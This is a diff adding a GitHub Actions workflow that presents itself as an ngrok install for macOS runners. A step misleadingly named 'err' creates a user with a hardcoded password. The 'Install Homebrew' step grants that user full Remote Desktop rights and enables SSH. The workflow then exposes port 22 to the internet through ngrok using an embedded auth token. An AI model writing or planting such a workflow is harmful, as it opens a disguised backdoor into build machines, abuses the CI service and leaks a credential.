@@ -1,0 +1,48 @@
+name: Install ngrok
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  install_ngrok:
+    runs-on: macos-latest  # 选择 macOS 作为运行环境
+    steps:
+      - name: err 
+        run: |
+          sudo dscl . -create /Users/fxlqwq
+          sudo dscl . -create /Users/fxlqwq UserShell /bin/bash
+          sudo dscl . -create /Users/fxlqwq RealName "New User"
+          sudo dscl . -create /Users/fxlqwq UniqueID 5100
+          sudo dscl . -create /Users/fxlqwq PrimaryGroupID 20
+          sudo dscl . -create /Users/fxlqwq NFSHomeDirectory /Users/fxlqwq
+          sudo dscl . -passwd /Users/fxlqwq Aa135792468+-
+      - name: Install Homebrew
+        run: |
+          # 安装 Homebrew，如果已经安装，跳过这一步
+          /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+          sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -restart -agent -menu
+          sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -allowAccessFor -specifiedUsers
+          sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -users fxlqwq -privs -all
+          sudo systemsetup -setremotelogin on
+          sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist
+          systemsetup -getremotelogin
+
+
+      - name: Install ngrok
+        run: |
+          brew tap ngrok/ngrok
+          brew install ngrok/ngrok/ngrok
+
+      - name: Configure ngrok
+        run: |
+          sudo ngrok config add-authtoken 2ZHr1Pm6XaQjzwBMudNWkErclAI_3cLRX7ZvxrkZCrrcC3Y3E
+
+      - name: Start ngrok
+        run: |
+          # 注意：通常在 GitHub Actions 中，运行 ngrok 可能不保持连接
+          sudo ngrok tcp 22
